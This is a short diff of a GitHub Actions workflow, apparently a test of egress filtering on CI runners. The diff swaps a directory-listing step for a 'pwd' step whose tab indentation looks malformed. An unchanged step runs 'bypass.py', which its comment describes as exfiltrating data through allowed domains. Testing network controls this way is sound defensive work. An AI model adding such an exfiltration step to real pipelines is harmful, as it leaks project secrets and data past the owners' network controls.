@@ -15,9 +15,8 @@ jobs:
              *.github.com
 
 
-      - name: List files in the repository
-        run: ls -la
-
+      - name: Print the current working directory
+  	run: pwd
 
       - name: Try making outbound connection (bypass)
         run: python3 bypass.py  # This runs the script that exfiltrates data via allowed domains
